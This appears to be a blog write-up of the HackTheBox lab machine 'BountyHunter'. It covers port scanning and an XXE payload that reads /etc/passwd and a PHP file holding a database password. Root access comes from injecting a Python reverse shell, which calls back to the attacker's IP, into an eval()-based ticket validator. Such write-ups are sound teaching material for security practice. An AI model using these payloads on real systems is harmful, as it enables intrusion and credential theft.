---
title: Bountyhunter writeup
date: 2022-06-21 14:00:00 +0200
categories: [Writeup, HackTheBox]
tags: ["Easy-box", "xxe"]     # TAG names should always be lowercase
img_path: /assets/img/boxes/bountyhunter/
image: # Thumbnail 
  src: Bountyhunter.png
  width: 1000   # in pixels
  height: 400   # in pixels
---                     
## Summary
This box includes XXE which gives us access to read local files. When reading these files we get access to credentials that can be used as SSH login. A python script is then available on the box which can be run as root and when exploited it gives a reverse shell. 

## Foothold
We start out by doing a port scan with nmap:
```console
nmap -sC -sV 10.129.95.166  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-21 15:18 CEST
Nmap scan report for 10.129.95.166
Host is up (0.027s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.77 seconds
```
As can be seen via the scan, two ports are open namely port 22 and 80, which host an ssh and http service repsectively. 
Visiting the web application on port 80 we get greeted with this:
![the welcome page of the application hosted on port 80](splash.png)
Before we go any further we scan the application with gobuster:
```console
gobuster dir -u http://10.129.95.166/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.95.166/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/06/21 15:19:15 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 25169]
/resources            (Status: 301) [Size: 318] [--> http://10.129.95.166/resources/]
/assets               (Status: 301) [Size: 315] [--> http://10.129.95.166/assets/]   
/portal.php           (Status: 200) [Size: 125]                                      
/css                  (Status: 301) [Size: 312] [--> http://10.129.95.166/css/]      
/db.php               (Status: 200) [Size: 0]                                        
/js                   (Status: 301) [Size: 311] [--> http://10.129.95.166/js/]       
Progress: 36248 / 175330 (20.67%)                                                   ^C
[!] Keyboard interrupt detected, terminating.
                                                                                     
===============================================================
2022/06/21 15:22:41 Finished
===============================================================
```
If we try to visit portal.php, we quickly get sent to log_submit.php.
![The `log_submit.php`{: .filepath} page](bounty_report.png)

We can then try to submit a report on the page. I started Burpsuite and setup the proxy and found that it sends the contents of the form as a base64 encoded and then url encoded XML form. See below:

![The burp request and response](burp_ini.png)
![The decoded data via cyberchef](cyberchef.png)

Since we are sending an XML form it might be vulnerable to an XXE [(XML External Entity)](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity) attack.

 I used the payload below payload to read the `/etc/passwd`{: .filepath} file. Remember to base64 and url encode it before sending it. 
 ```xml
 <?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
  <bugreport>
  <title>test</title>
  <cwe>test</cwe>
  <cvss>test</cvss>
  <reward>&file;</reward>
  </bugreport>
 ``` 
![the request and response including the passwd file](etc_passwd.png)

I then used this to load the contents of the `/var/www/html/db.php`{: .filepath} file, which includes credentials:

![Contents of the `db.php`{: .filepath} file](db_php.png)

The base64 decoded contents of both files can be found below: 
```console
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```
```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```
We can then login as the development user with the password found in the php file.

## Privilege escalation
Once logged in we run `sudo -l`: 
```console
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```
It seems that we have rights to run a python script as root. The contents of the script can be found below:
```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```
The interesting function in this script is the `evaluate(ticketFile)` function. If given a correctly formed `.md`{: .filepath} file, it will evaluate the ticket code, which it expects to be an arithmetic expression. If we instead insert python code into the ticket code, then this code will also be evaluated and therefore run. Because of this we can insert a python reverse shell in the file and then get root access. I used the script on the below file:
```md
# Skytrain Inc
## Ticket to Rome
__Ticket Code:__
**102+10==112 and exec('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.17.182",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')
```
When the script is run we get a reverse shell.
```console
┌──(bitis㉿workstation)-[~/htb/Machines/BountyHunter]
└─$ nc -lvnp 1234                                                                                                                                                                                                                       1 ⨯
listening on [any] 1234 ...
connect to [10.10.17.182] from (UNKNOWN) [10.129.95.166] 59012
# ls
invalid_tickets
ticketValidator.py
# cd /root
# cat root.txt
5cefca1942fd5e713a3443d779f24733
# 
```
Rooted!